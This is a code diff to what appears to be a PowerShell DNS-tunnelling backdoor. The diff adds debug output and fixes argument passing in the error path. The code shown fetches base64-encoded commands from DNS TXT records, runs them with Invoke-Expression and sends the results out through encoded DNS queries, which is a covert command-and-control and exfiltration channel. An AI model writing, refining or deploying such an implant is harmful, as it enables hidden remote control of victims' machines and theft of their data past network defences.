@@ -53,7 +53,7 @@ function Send-Data {
         $dnsQuery = "$currentChunk.$query"
 
         # Send DNS query
-        $dnsResult = Resolve-DnsName -Name $dnsQuery -ErrorAction Ignore
+        $dnsResult = Resolve-DnsName -Name $dnsQuery -ErrorAction Ignore -Type A
 
         if ($dnsResult) {
             # Never has a response ready, hopefully :-)
@@ -78,6 +78,7 @@ while (!$stop) {
     if ($dnsResult) {
         try{
             $command = $dnsResult.Strings
+            Write-Host "Command: $command"
             $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command))
             $output = $command | Invoke-Expression -ErrorAction Stop
             $output = ($output | Format-Table | Out-String)
@@ -92,9 +93,10 @@ while (!$stop) {
             } -code $code -counter $commandcount
         }
         catch {
+            Write-Host "Sending Error $_"
             Send-Data -data @{
                 output = "Error: $_"
-            }
+            } -code $code -counter $commandcount
         }
         $commandcount++
     }
